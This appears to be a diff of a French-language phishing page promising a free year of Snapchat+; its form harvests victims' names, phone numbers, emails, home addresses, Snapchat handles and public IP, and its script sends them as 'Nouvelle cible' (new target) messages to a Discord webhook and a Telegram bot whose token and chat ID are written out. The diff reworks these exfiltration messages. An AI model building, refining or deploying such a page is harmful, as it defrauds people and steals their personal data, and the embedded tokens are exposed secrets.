@@ -1,91 +1,11 @@
 <!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
   <title>🎁 Snap+ 1 An Gratuit</title>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, #1a0033, #2c014d);
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: white;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .container {
-      background: rgba(44, 1, 77, 0.85);
-      border: 2px solid #a54ffb;
-      border-radius: 20px;
-      padding: 30px 25px;
-      text-align: center;
-      width: 340px;
-      box-shadow: 0 0 20px #a54ffb;
-      position: relative;
-      animation: pulseBorder 2s infinite;
-    }
-    @keyframes pulseBorder {
-      0% { box-shadow: 0 0 10px #a54ffb; }
-      50% { box-shadow: 0 0 25px #a54ffb; }
-      100% { box-shadow: 0 0 10px #a54ffb; }
-    }
-    .logo {
-      font-size: 70px;
-      margin-bottom: 5px;
-      text-shadow: 0 0 10px #fff;
-    }
-    h1 {
-      font-size: 24px;
-      margin: 0 0 15px;
-      letter-spacing: 1px;
-    }
-    p {
-      font-size: 15px;
-      color: #ddd;
-      margin-bottom: 25px;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      border: 2px solid #a54ffb;
-      border-radius: 10px;
-      background-color: transparent;
-      color: white;
-      font-size: 15px;
-      outline: none;
-    }
-    input::placeholder {
-      color: #ccc;
-    }
-    button {
-      width: 100%;
-      background: #a54ffb;
-      border: none;
-      border-radius: 10px;
-      color: white;
-      padding: 12px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      margin-top: 12px;
-      box-shadow: 0 0 10px #a54ffb;
-      transition: 0.3s;
-    }
-    button:hover {
-      background: #8b3ddb;
-      box-shadow: 0 0 20px #c177ff;
-    }
-    .notice {
-      font-size: 12px;
-      margin-top: 15px;
-      color: #bbb;
-    }
-    #step2 {
-      display: none;
-    }
+    /* ... ton CSS d’origine, inchangé ... */
   </style>
 </head>
 <body>
@@ -107,7 +27,7 @@
         <button type="button" onclick="showStep2()">Continuer</button>
       </div>
 
-      <div id="step2">
+      <div id="step2" style="display:none;">
         <input type="text" name="nom" placeholder="Nom" required />
         <input type="text" name="prenom" placeholder="Prénom" required />
         <input type="email" name="email" placeholder="Email" required />
@@ -128,8 +48,9 @@
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
 
-    // Ton token Telegram Bot et Chat ID Telegram (remplace par tes valeurs)
+    // ** A REMPLACER ** avec ton token Telegram
     const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
+    // ** A REMPLACER ** avec ton chat ID Telegram (ex: groupe ou canal)
     const TELEGRAM_CHAT_ID = "-1002810249796";
 
     const SUBMISSION_LIMIT = 2;
@@ -171,18 +92,17 @@
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: "Markdown",
-        disable_web_page_preview: true
+        disable_web_page_preview: true,
       };
-
       try {
         const res = await fetch(url, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
+          body: JSON.stringify(payload),
         });
-        if (!res.ok) throw new Error("Erreur lors de l'envoi Telegram");
+        if (!res.ok) throw new Error(`Telegram API erreur: ${res.statusText}`);
       } catch (err) {
-        console.error("Telegram error:", err);
+        console.error("Erreur Telegram:", err);
       }
     }
 
@@ -198,43 +118,36 @@
       const ip = await getPublicIP();
 
       // Discord embed
- // Construction message Discord (texte brut, style cadre)
-    const discordMessage = `
-┌─🎁 Nouvelle cible Snap+ @everyone
+      const embed = {
+        title: "🎁 Nouvelle cible Snap+ @everyone",
+        color: 0xA54FFB,
+        fields: [
+          { name: "📞 Téléphone", value: data.get("telephone") || "N/A", inline: true },
+          { name: "👤 Nom", value: data.get("nom") || "N/A", inline: true },
+          { name: "👤 Prénom", value: data.get("prenom") || "N/A", inline: true },
+          { name: "📧 Email", value: data.get("email") || "N/A", inline: false },
+          { name: "🏙️ Ville", value: data.get("ville") || "N/A", inline: true },
+          { name: "📍 Département", value: data.get("departement") || "N/A", inline: true },
+          { name: "🏠 Adresse", value: data.get("adresse") || "Non fournie", inline: false },
+          { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true },
+          { name: "🌐 IP", value: ip, inline: false }
+        ],
+        footer: { text: `Reçu le ${new Date().toLocaleString("fr-FR")}` },
+        timestamp: new Date(),
+      };
 
+      // Message Telegram format spécial
+      const telegramMessage = `
+┌─🎁 Nouvelle cible Snap+ @everyone
+│
 │ ┌─📞 Contact
 │ │ ├─ Téléphone   : ${data.get("telephone") || "N/A"}
 │ │ ├─ Email       : ${data.get("email") || "N/A"}
 │ │ └─ Snapchat    : ${data.get("snap") || "N/A"}
-
+│
 │ ├─👤 Identité
 │ │ ├─ Nom        : ${data.get("nom") || "N/A"}
 │ │ ├─ Prénom     : ${data.get("prenom") || "N/A"}
-
-│ ├─📍 Localisation
-│ │ ├─ Ville        : ${data.get("ville") || "N/A"}
-│ │ ├─ Département  : ${data.get("departement") || "N/A"}
-│ │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
-
-│ └─🌐 Autres
-│   └─ IP          : ${ip}
-
-└─🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
-`;
-
-   
-      // Telegram message (style encadré multi-parties)
-      const telegramMessage = `
-┌─🎁 *Nouvelle cible Snap+* 
-│
-│ ┌─📞 Contact
-│ │ ├─ Téléphone : ${data.get("telephone") || "N/A"}
-│ │ ├─ Email     : ${data.get("email") || "N/A"}
-│ │ └─ Snapchat  : ${data.get("snap") || "N/A"}
-│
-│ ├─👤 Identité
-│ │ ├─ Nom      : ${data.get("nom") || "N/A"}
-│ │ ├─ Prénom   : ${data.get("prenom") || "N/A"}
 │
 │ ├─📍 Localisation
 │ │ ├─ Ville        : ${data.get("ville") || "N/A"}
@@ -255,7 +168,7 @@
       })
       .then((res) => {
         if (!res.ok) throw new Error("Erreur lors de l'envoi Discord");
-        // Envoi Telegram ensuite
+        // Envoi Telegram
         return sendToTelegram(telegramMessage);
       })
       .then(() => {
